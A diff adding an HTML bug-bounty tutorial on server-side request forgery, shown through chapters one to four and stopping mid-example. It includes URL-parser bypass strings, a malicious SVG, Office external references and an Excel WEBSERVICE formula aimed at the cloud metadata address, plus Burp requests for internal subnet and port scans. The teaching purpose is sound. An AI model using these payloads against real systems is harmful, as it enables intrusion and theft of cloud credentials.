@@ -1,0 +1,1840 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SSRF: The Complete Field Manual</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700;900&display=swap');
+
+  :root {
+    --bg:       #0a0d14;
+    --surface:  #111520;
+    --card:     #161c2e;
+    --border:   #1e2840;
+    --accent:   #00e5ff;
+    --accent2:  #ff4d6d;
+    --accent3:  #b8ff57;
+    --warn:     #ffaa00;
+    --text:     #e2e8f0;
+    --muted:    #64748b;
+    --code-bg:  #0d1117;
+    --green:    #39d353;
+    --red:      #ff4d6d;
+    --purple:   #b57bee;
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 15px;
+    line-height: 1.75;
+  }
+
+  /* ── COVER ── */
+  #cover {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 60px 24px;
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,229,255,.08) 0%, transparent 70%),
+                radial-gradient(ellipse 60% 40% at 80% 80%, rgba(255,77,109,.06) 0%, transparent 70%),
+                var(--bg);
+    position: relative;
+    overflow: hidden;
+  }
+
+  #cover::before {
+    content:'';
+    position:absolute; inset:0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(255,255,255,.02) 40px),
+                repeating-linear-gradient(90deg, transparent, transparent 39px, rgba(255,255,255,.02) 40px);
+    pointer-events:none;
+  }
+
+  .cover-label {
+    font-family:'JetBrains Mono', monospace;
+    font-size:11px;
+    letter-spacing:.25em;
+    text-transform:uppercase;
+    color: var(--accent);
+    margin-bottom:24px;
+    border: 1px solid rgba(0,229,255,.3);
+    padding: 6px 18px;
+    border-radius:2px;
+  }
+
+  .cover-title {
+    font-size: clamp(40px, 7vw, 80px);
+    font-weight: 900;
+    line-height: 1;
+    letter-spacing: -2px;
+    color: #fff;
+    margin-bottom: 8px;
+  }
+
+  .cover-title span { color: var(--accent); }
+
+  .cover-sub {
+    font-size: clamp(16px, 2.5vw, 22px);
+    font-weight: 300;
+    color: var(--muted);
+    margin-top: 12px;
+    margin-bottom: 40px;
+  }
+
+  .cover-stats {
+    display: flex;
+    gap: 40px;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin-bottom: 52px;
+  }
+
+  .stat { text-align:center; }
+  .stat .n { font-size: 32px; font-weight:900; color: var(--accent3); font-family:'JetBrains Mono',monospace; }
+  .stat .l { font-size:11px; text-transform:uppercase; letter-spacing:.1em; color:var(--muted); margin-top:2px; }
+
+  .toc-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap:12px;
+    max-width:900px;
+    width:100%;
+    text-align:left;
+  }
+
+  .toc-item {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 14px 18px;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: border-color .2s, background .2s;
+    text-decoration:none;
+    display:block;
+  }
+  .toc-item:hover { border-color: var(--accent); background: var(--card); }
+  .toc-item .ch { font-size:10px; font-family:'JetBrains Mono',monospace; color:var(--accent); letter-spacing:.15em; text-transform:uppercase; margin-bottom:4px; }
+  .toc-item .tt { font-size:13px; font-weight:600; color:var(--text); }
+
+  /* ── LAYOUT ── */
+  main { max-width: 900px; margin: 0 auto; padding: 48px 24px 120px; }
+
+  /* ── CHAPTER HEADERS ── */
+  .chapter-header {
+    margin: 80px 0 40px;
+    padding: 40px;
+    background: linear-gradient(135deg, var(--surface) 0%, var(--card) 100%);
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    position: relative;
+    overflow: hidden;
+  }
+  .chapter-header::after {
+    content: attr(data-ch);
+    position:absolute; right:24px; top:16px;
+    font-size:80px; font-weight:900; color:rgba(255,255,255,.03);
+    font-family:'JetBrains Mono',monospace; line-height:1;
+  }
+  .chapter-header .ch-label {
+    font-family:'JetBrains Mono',monospace;
+    font-size:11px; letter-spacing:.2em; text-transform:uppercase;
+    color:var(--accent); margin-bottom:10px;
+  }
+  .chapter-header h2 {
+    font-size: clamp(22px, 4vw, 36px);
+    font-weight:900; color:#fff; letter-spacing:-1px;
+  }
+  .chapter-header p { color:var(--muted); margin-top:10px; font-size:14px; }
+
+  /* ── SECTION ── */
+  h3 {
+    font-size: 20px; font-weight:700; color:#fff;
+    margin: 48px 0 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+  h4 { font-size:15px; font-weight:600; color:var(--accent); margin:28px 0 10px; }
+  p { color:var(--text); margin-bottom:14px; }
+
+  /* ── CODE ── */
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius:6px;
+    padding:20px;
+    overflow-x:auto;
+    margin:16px 0 24px;
+    font-family:'JetBrains Mono',monospace;
+    font-size:13px;
+    line-height:1.7;
+    color:#e2e8f0;
+    position:relative;
+  }
+  pre .c  { color:var(--muted); font-style:italic; }
+  pre .kw { color:var(--accent); }
+  pre .st { color:var(--accent3); }
+  pre .cp { color:var(--warn); }
+  pre .cm { color:var(--accent2); }
+  pre .ok { color:var(--green); }
+  pre .bad{ color:var(--red); }
+  pre .pu { color:var(--purple); }
+
+  .pre-label {
+    font-size:10px; letter-spacing:.15em; text-transform:uppercase;
+    color:var(--accent); font-family:'JetBrains Mono',monospace;
+    margin-bottom:4px; display:block;
+  }
+
+  code {
+    font-family:'JetBrains Mono',monospace;
+    font-size:12px; background:var(--card);
+    border:1px solid var(--border); padding:2px 6px;
+    border-radius:3px; color:var(--accent3);
+  }
+
+  /* ── CARDS ── */
+  .info-box {
+    border:1px solid;
+    border-radius:6px;
+    padding:18px 20px;
+    margin:20px 0;
+  }
+  .info-box.tip   { border-color:rgba(0,229,255,.4); background:rgba(0,229,255,.05); }
+  .info-box.warn  { border-color:rgba(255,170,0,.4); background:rgba(255,170,0,.05); }
+  .info-box.danger{ border-color:rgba(255,77,109,.4); background:rgba(255,77,109,.05); }
+  .info-box.bounty{ border-color:rgba(184,255,87,.4); background:rgba(184,255,87,.05); }
+  .info-box .box-title {
+    font-size:11px; text-transform:uppercase; letter-spacing:.15em;
+    font-weight:700; margin-bottom:8px; font-family:'JetBrains Mono',monospace;
+  }
+  .info-box.tip    .box-title { color:var(--accent); }
+  .info-box.warn   .box-title { color:var(--warn); }
+  .info-box.danger .box-title { color:var(--accent2); }
+  .info-box.bounty .box-title { color:var(--accent3); }
+
+  /* ── REPORT CARDS ── */
+  .report-card {
+    background: var(--card);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:24px;
+    margin:20px 0;
+    border-left:4px solid var(--accent3);
+  }
+  .report-card .r-header {
+    display:flex; justify-content:space-between; align-items:flex-start;
+    flex-wrap:wrap; gap:8px; margin-bottom:14px;
+  }
+  .report-card .r-company { font-weight:700; font-size:16px; color:#fff; }
+  .report-card .r-bounty  {
+    font-family:'JetBrains Mono',monospace; font-weight:700;
+    font-size:18px; color:var(--accent3);
+    background:rgba(184,255,87,.1); border:1px solid rgba(184,255,87,.3);
+    padding:4px 12px; border-radius:4px;
+  }
+  .report-card .r-badge {
+    font-size:10px; font-family:'JetBrains Mono',monospace;
+    text-transform:uppercase; letter-spacing:.1em;
+    padding:3px 8px; border-radius:3px; font-weight:700;
+    display:inline-block; margin-right:6px; margin-bottom:8px;
+  }
+  .r-critical { background:rgba(255,77,109,.2); color:var(--accent2); border:1px solid rgba(255,77,109,.3); }
+  .r-high     { background:rgba(255,170,0,.2);  color:var(--warn);    border:1px solid rgba(255,170,0,.3); }
+  .r-steps    { margin-top:12px; }
+  .r-steps li { color:var(--text); font-size:14px; margin:4px 0 4px 18px; }
+
+  /* ── PAYLOAD TABLE ── */
+  .payload-table { width:100%; border-collapse:collapse; margin:16px 0 24px; }
+  .payload-table th {
+    background:var(--card); color:var(--muted);
+    font-size:11px; text-transform:uppercase; letter-spacing:.1em;
+    padding:10px 14px; text-align:left;
+    border-bottom:1px solid var(--border);
+    font-family:'JetBrains Mono',monospace;
+  }
+  .payload-table td {
+    padding:10px 14px;
+    border-bottom:1px solid rgba(30,40,64,.5);
+    font-family:'JetBrains Mono',monospace;
+    font-size:12px;
+    vertical-align:top;
+  }
+  .payload-table tr:hover td { background:rgba(255,255,255,.02); }
+  .payload-table td:first-child { color:var(--accent3); }
+  .payload-table td:last-child  { color:var(--muted); font-family:'Inter',sans-serif; font-size:13px; }
+
+  /* ── FLOW DIAGRAM ── */
+  .flow {
+    display:flex; flex-direction:column; gap:0;
+    margin:24px 0;
+  }
+  .flow-step {
+    display:flex; align-items:flex-start; gap:16px;
+    padding:16px 0;
+    border-left:2px solid var(--border);
+    padding-left:24px;
+    position:relative;
+  }
+  .flow-step::before {
+    content:'';
+    position:absolute; left:-7px; top:22px;
+    width:12px; height:12px;
+    background:var(--accent); border-radius:50%;
+  }
+  .flow-step.bad::before { background:var(--accent2); }
+  .flow-step.ok::before  { background:var(--accent3); }
+  .flow-num { min-width:28px; height:28px; background:var(--card); border:1px solid var(--border); border-radius:4px; display:flex; align-items:center; justify-content:center; font-family:'JetBrains Mono',monospace; font-size:12px; font-weight:700; color:var(--accent); }
+  .flow-text strong { display:block; color:#fff; font-size:14px; margin-bottom:4px; }
+  .flow-text span   { color:var(--muted); font-size:13px; }
+
+  /* ── NAV ── */
+  .nav-bar {
+    position:sticky; top:0; z-index:100;
+    background:rgba(10,13,20,.95);
+    backdrop-filter:blur(12px);
+    border-bottom:1px solid var(--border);
+    padding:0 24px;
+    display:flex; align-items:center; gap:24px;
+    overflow-x:auto; height:48px;
+  }
+  .nav-bar a {
+    font-size:12px; text-decoration:none; color:var(--muted);
+    white-space:nowrap; padding:4px 0;
+    border-bottom:2px solid transparent;
+    transition:color .2s, border-color .2s;
+    font-family:'JetBrains Mono',monospace;
+  }
+  .nav-bar a:hover { color:var(--accent); border-bottom-color:var(--accent); }
+  .nav-logo { font-weight:900; color:#fff; font-size:13px; margin-right:8px; white-space:nowrap; }
+
+  /* ── METHODOLOGY ── */
+  .method-grid {
+    display:grid; grid-template-columns:repeat(auto-fit, minmax(240px, 1fr));
+    gap:12px; margin:20px 0;
+  }
+  .method-card {
+    background:var(--card); border:1px solid var(--border);
+    border-radius:6px; padding:18px;
+  }
+  .method-card .m-icon { font-size:24px; margin-bottom:10px; }
+  .method-card .m-title { font-weight:700; color:#fff; margin-bottom:6px; }
+  .method-card .m-desc  { font-size:13px; color:var(--muted); }
+
+  /* ── PHASE BANNER ── */
+  .phase {
+    background: linear-gradient(90deg, rgba(0,229,255,.08) 0%, transparent 100%);
+    border:1px solid rgba(0,229,255,.2);
+    border-radius:4px; padding:12px 18px;
+    font-family:'JetBrains Mono',monospace;
+    font-size:11px; color:var(--accent);
+    text-transform:uppercase; letter-spacing:.15em;
+    margin:32px 0 16px;
+  }
+
+  /* ── HR ── */
+  hr { border:none; border-top:1px solid var(--border); margin:48px 0; }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width:6px; height:6px; }
+  ::-webkit-scrollbar-track { background:var(--bg); }
+  ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+  ::-webkit-scrollbar-thumb:hover { background:var(--muted); }
+
+  /* ── RESPONSIVE ── */
+  @media(max-width:640px) {
+    .chapter-header { padding:24px; }
+    .cover-stats { gap:20px; }
+  }
+
+  /* ── WORDLIST ── */
+  .wordlist {
+    display:grid; grid-template-columns:repeat(auto-fill, minmax(180px, 1fr));
+    gap:4px; margin:14px 0;
+  }
+  .wordlist code { display:block; border-radius:2px; }
+
+  /* ── INDEX ── */
+  .index-tag {
+    display:inline-block; margin:3px;
+    background:var(--card); border:1px solid var(--border);
+    border-radius:3px; padding:3px 10px;
+    font-size:12px; font-family:'JetBrains Mono',monospace;
+    color:var(--muted);
+  }
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════ COVER ══════════════════════════════════ -->
+<section id="cover">
+  <div class="cover-label">Field Manual · Bug Bounty Edition · 2025–2026</div>
+  <h1 class="cover-title"><span>SSRF</span> COMPLETE</h1>
+  <p class="cover-sub">Server-Side Request Forgery — From Zero to Critical</p>
+
+  <div class="cover-stats">
+    <div class="stat"><div class="n">12</div><div class="l">Chapters</div></div>
+    <div class="stat"><div class="n">$50K</div><div class="l">Max Bounty Seen</div></div>
+    <div class="stat"><div class="n">106M</div><div class="l">Records in Biggest SSRF Breach</div></div>
+    <div class="stat"><div class="n">80+</div><div class="l">Bypass Payloads</div></div>
+    <div class="stat"><div class="n">8</div><div class="l">Real-World Reports</div></div>
+  </div>
+
+  <div class="toc-grid">
+    <a class="toc-item" href="#ch1"><div class="ch">Chapter 1</div><div class="tt">What Is SSRF?</div></a>
+    <a class="toc-item" href="#ch2"><div class="ch">Chapter 2</div><div class="tt">Anatomy of a Request</div></a>
+    <a class="toc-item" href="#ch3"><div class="ch">Chapter 3</div><div class="tt">Finding the Attack Surface</div></a>
+    <a class="toc-item" href="#ch4"><div class="ch">Chapter 4</div><div class="tt">Basic Exploitation</div></a>
+    <a class="toc-item" href="#ch5"><div class="ch">Chapter 5</div><div class="tt">Bypass Techniques</div></a>
+    <a class="toc-item" href="#ch6"><div class="ch">Chapter 6</div><div class="tt">Blind SSRF</div></a>
+    <a class="toc-item" href="#ch7"><div class="ch">Chapter 7</div><div class="tt">Cloud Metadata Attacks</div></a>
+    <a class="toc-item" href="#ch8"><div class="ch">Chapter 8</div><div class="tt">Protocols &amp; RCE Chains</div></a>
+    <a class="toc-item" href="#ch9"><div class="ch">Chapter 9</div><div class="tt">Real-World Reports</div></a>
+    <a class="toc-item" href="#ch10"><div class="ch">Chapter 10</div><div class="tt">Complete Payload Arsenal</div></a>
+    <a class="toc-item" href="#ch11"><div class="ch">Chapter 11</div><div class="tt">Hunting Methodology</div></a>
+    <a class="toc-item" href="#ch12"><div class="ch">Chapter 12</div><div class="tt">Defense &amp; Writing Reports</div></a>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════ NAV ══════════════════════════════════ -->
+<nav class="nav-bar">
+  <span class="nav-logo">SSRF MANUAL</span>
+  <a href="#ch1">Fundamentals</a>
+  <a href="#ch2">Anatomy</a>
+  <a href="#ch3">Surface</a>
+  <a href="#ch4">Exploitation</a>
+  <a href="#ch5">Bypasses</a>
+  <a href="#ch6">Blind SSRF</a>
+  <a href="#ch7">Cloud</a>
+  <a href="#ch8">Protocols/RCE</a>
+  <a href="#ch9">Reports</a>
+  <a href="#ch10">Payloads</a>
+  <a href="#ch11">Methodology</a>
+  <a href="#ch12">Defense</a>
+</nav>
+
+<main>
+
+<!-- ══════════════════════════ CHAPTER 1 ══════════════════════════ -->
+<section id="ch1">
+  <div class="chapter-header" data-ch="01">
+    <div class="ch-label">Chapter 01</div>
+    <h2>What Is SSRF?</h2>
+    <p>The fundamental concepts, threat model, and why this vulnerability class is so devastating in modern cloud infrastructure.</p>
+  </div>
+
+  <h3>1.1 The Core Concept</h3>
+  <p>Server-Side Request Forgery (SSRF) is a vulnerability class where an attacker can coerce a server-side application into making HTTP (or other protocol) requests to an unintended destination. Unlike most client-side attacks, <strong>the request originates from the server itself</strong> — making it appear to come from a trusted internal machine.</p>
+
+  <p>The simplest mental model: imagine the vulnerable application acts as a web browser. You, the attacker, are passing it a URL to fetch. If the application blindly fetches whatever you provide without validation, you've just gained a proxy inside the target's network perimeter.</p>
+
+  <div class="flow">
+    <div class="flow-step">
+      <div class="flow-num">1</div>
+      <div class="flow-text">
+        <strong>Normal flow</strong>
+        <span>User → Application → Legitimate external service</span>
+      </div>
+    </div>
+    <div class="flow-step bad">
+      <div class="flow-num">2</div>
+      <div class="flow-text">
+        <strong>SSRF attack</strong>
+        <span>Attacker → Application → Internal service / metadata / admin panel</span>
+      </div>
+    </div>
+    <div class="flow-step ok">
+      <div class="flow-num">3</div>
+      <div class="flow-text">
+        <strong>Impact</strong>
+        <span>Server's trusted position used to access resources the attacker cannot reach directly</span>
+      </div>
+    </div>
+  </div>
+
+  <h3>1.2 Why It's So Dangerous</h3>
+  <p>The power of SSRF comes from <strong>trust exploitation</strong>. Internal services frequently operate under the assumption that anything making a request to them from inside the network is legitimate and trustworthy. Firewalls protect the perimeter — not internal east-west traffic. Once you make the application server your proxy, you inherit all its trust relationships.</p>
+
+  <p>In cloud environments (AWS, GCP, Azure), this trust is formalized: every compute instance has a metadata service reachable only from that machine. That metadata service serves temporary credentials. Those credentials can be used to act as the machine's IAM identity. SSRF + over-privileged IAM = infrastructure compromise. This is exactly what happened in the Capital One breach affecting 106 million people.</p>
+
+  <div class="info-box danger">
+    <div class="box-title">⚡ SSRF Impact Scale</div>
+    <p><strong>Low:</strong> Confirm internal ports are open (information disclosure)</p>
+    <p><strong>Medium:</strong> Read internal admin panels, internal APIs</p>
+    <p><strong>High:</strong> Exfiltrate cloud IAM credentials, read internal files</p>
+    <p><strong>Critical:</strong> Use credentials to take over cloud infrastructure, chain to RCE via internal services (Redis, Memcached, SMTP)</p>
+  </div>
+
+  <h3>1.3 SSRF Taxonomy</h3>
+
+  <h4>Full-Response SSRF (In-Band)</h4>
+  <p>The server makes your requested HTTP call and reflects the response body back to you. You can read the content directly. This is the highest-value variant — reading AWS credentials, internal API responses, config files, etc. Most PortSwigger lab scenarios.</p>
+
+  <h4>Blind SSRF (Out-of-Band)</h4>
+  <p>The server makes the request but you never see the response. You can only detect it via side-channels: DNS callbacks, timing differences, or interaction with an external server you control (Burp Collaborator). Harder to exploit but still valuable — you can pivot to RCE by targeting vulnerable internal services via protocol smuggling.</p>
+
+  <h4>Semi-Blind SSRF</h4>
+  <p>You can't read the response, but the application leaks partial information — response time differences for open vs closed ports, different HTTP status codes, error messages containing internal hostnames, or varying content lengths.</p>
+
+  <h4>Second-Order (Stored) SSRF</h4>
+  <p>Your malicious URL is stored in the database and the request happens later — during a background job, async PDF generation, scheduled data sync, image re-processing, or webhook retry. The most overlooked variant. The input and the request are temporally separated, making it invisible to immediate testing.</p>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 2 ══════════════════════════ -->
+<section id="ch2">
+  <div class="chapter-header" data-ch="02">
+    <div class="ch-label">Chapter 02</div>
+    <h2>Anatomy of an HTTP Request — What You're Manipulating</h2>
+    <p>You can't exploit what you don't understand. Every SSRF bypass depends on knowing exactly how URLs are parsed and validated.</p>
+  </div>
+
+  <h3>2.1 URL Structure Deep Dive</h3>
+  <p>A URL has multiple components, each of which can be abused independently:</p>
+
+  <pre><span class="kw">scheme</span>://<span class="st">userinfo@</span><span class="cp">host</span><span class="ok">:port</span><span class="pu">/path</span>?<span class="cm">query</span>#<span class="bad">fragment</span>
+
+  Example:
+  <span class="kw">https</span>://<span class="st">admin:pass@</span><span class="cp">evil.com</span><span class="ok">:8080</span><span class="pu">/internal/api</span>?<span class="cm">token=abc</span>#<span class="bad">section</span>
+
+  Key abuse points:
+  <span class="st">userinfo @</span>  → Validator reads host before @, HTTP client uses host after @
+  <span class="cp">host</span>        → Can be IP in many representations, IPv6, or domain
+  <span class="ok">:port</span>       → Non-standard ports bypass some domain whitelist checks
+  <span class="bad">#fragment</span>   → Server never sees fragment; can be used in parsing confusion
+  <span class="pu">/path</span>       → Path traversal, double-encoding, null bytes</pre>
+
+  <h3>2.2 Parser Inconsistency — The Root of Most Bypasses</h3>
+  <p>The fundamental reason bypass techniques work is that the <strong>code that validates a URL</strong> and the <strong>code that actually makes the HTTP request</strong> are different — and they parse URLs differently. This gap is the exploit surface.</p>
+
+  <div class="info-box warn">
+    <div class="box-title">🔑 Orange Tsai's Key Insight (Black Hat 2017)</div>
+    <p>Different URL libraries in Python, Java, PHP, Ruby, Go, and Node.js produce different results for the same ambiguous URL. An attacker who knows these inconsistencies can craft a URL that passes validation (reads as safe) but resolves to an internal address when actually fetched.</p>
+  </div>
+
+  <pre><span class="c"># Confusion attack examples from Orange Tsai's research</span>
+http://127.1.1.1:80\<span class="bad">@</span>127.2.2.2:80/   <span class="c"># Validator: 127.1.1.1, Client: 127.2.2.2</span>
+http://127.1.1.1:80\<span class="bad">@@</span>127.2.2.2:80/
+http://1.1.1.1 <span class="bad">&amp;@</span>2.2.2.2# @3.3.3.3/  <span class="c"># PHP behavior vs curl behavior</span>
+
+<span class="c"># Backslash trick (WHATWG vs RFC3986)</span>
+http:<span class="bad">\</span>127.0.0.1/           <span class="c"># WHATWG treats \ as / — bypasses checks for ://</span>
+http://evil.com<span class="bad">\</span>127.0.0.1/ <span class="c"># Some parsers split on \ differently than /</span>
+
+<span class="c"># @-based confusion</span>
+https://expected-host<span class="bad">@</span>evil-host/  <span class="c"># Validator sees expected-host; client dials evil-host</span>
+https://[<span class="bad">[</span>expected.com@attacker.com  <span class="c"># Spring UriComponentsBuilder confusion</span></pre>
+
+  <h3>2.3 How the Vulnerable Code Looks</h3>
+  <p>Understanding the server-side code pattern helps you spot it in bug hunting and understand exactly what's happening:</p>
+
+  <span class="pre-label">PHP — vulnerable pattern</span>
+  <pre><span class="c">// User controls $url — no validation</span>
+$url = $_POST['stockApi'];
+$response = file_get_contents($url);  <span class="c">// Can fetch internal resources</span>
+echo $response;</pre>
+
+  <span class="pre-label">Python (requests) — vulnerable pattern</span>
+  <pre><span class="kw">import</span> requests
+
+url = request.form[<span class="st">'url'</span>]          <span class="c"># User-controlled</span>
+<span class="c"># No validation whatsoever</span>
+r = requests.get(url, timeout=5)
+<span class="kw">return</span> r.text                        <span class="c"># Response reflected to user</span></pre>
+
+  <span class="pre-label">Node.js — vulnerable pattern</span>
+  <pre"><span class="kw">const</span> axios = require(<span class="st">'axios'</span>);
+
+app.post(<span class="st">'/fetch'</span>, <span class="kw">async</span> (req, res) => {
+  <span class="kw">const</span> url = req.body.url;    <span class="c">// User-controlled</span>
+  <span class="kw">const</span> resp = <span class="kw">await</span> axios.get(url);
+  res.json(resp.data);          <span class="c">// Reflected to attacker</span>
+});</pre>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 3 ══════════════════════════ -->
+<section id="ch3">
+  <div class="chapter-header" data-ch="03">
+    <div class="ch-label">Chapter 03</div>
+    <h2>Finding the Attack Surface</h2>
+    <p>Where SSRF hides in real applications — and how to uncover it systematically.</p>
+  </div>
+
+  <h3>3.1 Obvious Entry Points (Check First)</h3>
+
+  <p>These parameter names are classic SSRF candidates. Always test them immediately:</p>
+
+  <div class="wordlist">
+    <code>url=</code><code>uri=</code><code>path=</code><code>dest=</code><code>redirect=</code>
+    <code>next=</code><code>target=</code><code>link=</code><code>source=</code><code>image=</code>
+    <code>image_url=</code><code>avatar=</code><code>callback=</code><code>return=</code><code>r=</code>
+    <code>proxy=</code><code>feed=</code><code>data=</code><code>reference=</code><code>site=</code>
+    <code>webhook=</code><code>endpoint=</code><code>host=</code><code>page=</code><code>file=</code>
+    <code>document=</code><code>import=</code><code>fetch=</code><code>resource=</code><code>from=</code>
+    <code>to=</code><code>out=</code><code>view=</code><code>show=</code><code>open=</code>
+    <code>return_url=</code><code>redirect_url=</code><code>continue=</code><code>go=</code>
+  </div>
+
+  <div class="info-box tip">
+    <div class="box-title">💡 Pro Tip: grep JS files</div>
+    <p>Run: <code>grep -r "fetch\|axios\|http\.get\|file_get_contents\|urllib\|requests\.get" --include="*.js"</code> on downloaded JS bundles. Also grep for parameter names above in minified JS to find hidden endpoints feeding URLs to backend.</p>
+  </div>
+
+  <h3>3.2 Feature Categories That Always Contain SSRF</h3>
+
+  <div class="method-grid">
+    <div class="method-card">
+      <div class="m-icon">🔗</div>
+      <div class="m-title">URL Preview / Link Unfurl</div>
+      <div class="m-desc">Chat apps, Slack-style tools, social platforms that fetch OG metadata. The fetch happens server-side. Always test with Collaborator URL.</div>
+    </div>
+    <div class="method-card">
+      <div class="m-icon">📎</div>
+      <div class="m-title">Import from URL</div>
+      <div class="m-desc">Dropbox/GDrive/OneDrive import, "add from web", import CSV from URL, document import. These fetch user-controlled URLs.</div>
+    </div>
+    <div class="method-card">
+      <div class="m-icon">🖼️</div>
+      <div class="m-title">Avatar / Image by URL</div>
+      <div class="m-desc">Profile avatar via external URL. The server downloads and re-hosts the image. Points for testing: the download endpoint, not the display.</div>
+    </div>
+    <div class="method-card">
+      <div class="m-icon">📄</div>
+      <div class="m-title">PDF / Screenshot Generation</div>
+      <div class="m-desc">Any feature rendering HTML to PDF (wkhtmltopdf, puppeteer, PhantomJS). Inject &lt;iframe src="http://169.254.169.254/..."&gt; or &lt;img src=...&gt; in user-controlled content.</div>
+    </div>
+    <div class="method-card">
+      <div class="m-icon">🔔</div>
+      <div class="m-title">Webhooks / Callbacks</div>
+      <div class="m-desc">Payment providers, CI/CD triggers, Zapier-style integrations. You supply the callback URL. Test redirects and SSRF directly.</div>
+    </div>
+    <div class="method-card">
+      <div class="m-icon">🔐</div>
+      <div class="m-title">SSO / OAuth Config</div>
+      <div class="m-desc">SAML metadata URL, OIDC discovery endpoint, custom identity provider URL. The server fetches these URLs to configure SSO.</div>
+    </div>
+    <div class="method-card">
+      <div class="m-icon">📡</div>
+      <div class="m-title">RSS / Feed Aggregation</div>
+      <div class="m-desc">Any "subscribe to RSS feed" or "add data source" feature. The URL is fetched server-side.</div>
+    </div>
+    <div class="method-card">
+      <div class="m-icon">📊</div>
+      <div class="m-title">Stock / Price Checkers</div>
+      <div class="m-desc">Classic PortSwigger lab pattern. stockApi parameter containing a full URL is trivially exploitable.</div>
+    </div>
+    <div class="method-card">
+      <div class="m-icon">🖥️</div>
+      <div class="m-title">HTTP Headers</div>
+      <div class="m-desc">X-Forwarded-For, Referer, Origin, Host, X-Real-IP, Client-IP. Analytics/logging code that fetches the Referer URL is a classic blind SSRF source.</div>
+    </div>
+  </div>
+
+  <h3>3.3 Hidden / Non-Obvious Sources</h3>
+
+  <h4>SVG / XML File Uploads</h4>
+  <p>SVG files support external entity references and embedded images. An SVG with <code>&lt;image href="http://169.254.169.254/"&gt;</code> can trigger server-side fetching when the SVG is processed or rendered server-side.</p>
+
+  <pre><span class="c">&lt;!-- Malicious SVG for SSRF --&gt;</span>
+&lt;<span class="kw">svg</span> xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
+  &lt;<span class="kw">image</span> xlink:href=<span class="st">"http://169.254.169.254/latest/meta-data/"</span> /&gt;
+&lt;/svg&gt;</pre>
+
+  <h4>Office Documents (XLSX, DOCX)</h4>
+  <p>Microsoft Office docs are ZIP archives containing XML. The XML can contain external references. When the server processes these for preview/conversion, the external entities are fetched:</p>
+
+  <pre><span class="c">&lt;!-- Inside word/_rels/document.xml.rels --&gt;</span>
+&lt;Relationship Id=<span class="st">"rId1"</span> Type=<span class="st">"..."</span>
+  Target=<span class="bad">"http://169.254.169.254/latest/meta-data/"</span>
+  TargetMode=<span class="st">"External"</span>/&gt;
+
+<span class="c">&lt;!-- Excel WEBSERVICE function --&gt;</span>
+=WEBSERVICE(<span class="st">"http://169.254.169.254/latest/meta-data/"</span>)</pre>
+
+  <h4>FFmpeg / Video Processing</h4>
+  <p>FFmpeg supports HLS playlists which can reference external files. If a target allows video upload and uses FFmpeg for processing, a malicious HLS playlist can trigger SSRF.</p>
+
+  <h4>Indirect / Second-Order SSRF</h4>
+  <p>Submit a URL to a profile field, report template, notification setting, or data import. The server stores it. Later, a background job processes it and makes the HTTP request. You won't see the effect immediately — use Burp Collaborator and wait, or check the application's behavior on a time delay.</p>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 4 ══════════════════════════ -->
+<section id="ch4">
+  <div class="chapter-header" data-ch="04">
+    <div class="ch-label">Chapter 04</div>
+    <h2>Basic Exploitation Techniques</h2>
+    <p>The core attack patterns that work before any defenses are in place.</p>
+  </div>
+
+  <h3>4.1 Loopback / Localhost Attack</h3>
+  <p>The server's own loopback interface typically grants access to internal admin panels, debug consoles, and management APIs not exposed externally. Many internal services explicitly trust <code>127.0.0.1</code> requests with no authentication.</p>
+
+  <span class="pre-label">Burp Suite — intercepted stock check request</span>
+  <pre>POST /product/stock HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+<span class="bad">stockApi=http%3A%2F%2F192.168.0.1%3A8080%2F...</span>
+<span class="c"># URL-decode first in Burp Decoder (Ctrl+Shift+U), then modify:</span>
+
+<span class="ok">stockApi=http://localhost/admin</span>
+<span class="ok">stockApi=http://127.0.0.1/admin</span>
+<span class="ok">stockApi=http://127.0.0.1:8080/admin</span></pre>
+
+  <h3>4.2 Internal Network Scanning</h3>
+  <p>Use Burp Intruder to sweep internal subnets and discover services. Differentiate live hosts by response code, response size, or response time.</p>
+
+  <span class="pre-label">Burp Intruder — internal subnet scan</span>
+  <pre>POST /product/stock HTTP/1.1
+Host: target.com
+
+stockApi=http://192.168.0.<span class="bad">§1§</span>:8080/admin
+
+<span class="c"># Payload: Numbers → From: 1, To: 255, Step: 1
+# Sort results by Status Code — 200 = admin panel found
+# Sort by Response Length — different length = live host</span></pre>
+
+  <div class="info-box tip">
+    <div class="box-title">💡 Port Scanning via SSRF</div>
+    <p>Response time is your signal for closed ports — a connection refused response is instant (TCP RST), while a filtered port times out. Sweep common internal ports: 22, 80, 443, 3306, 5432, 6379, 8080, 8443, 8500, 9090, 9200, 10250.</p>
+  </div>
+
+  <pre><span class="c"># Common internal services to target via port scan</span>
+http://127.0.0.1:6379/   <span class="c"># Redis</span>
+http://127.0.0.1:5432/   <span class="c"># PostgreSQL</span>
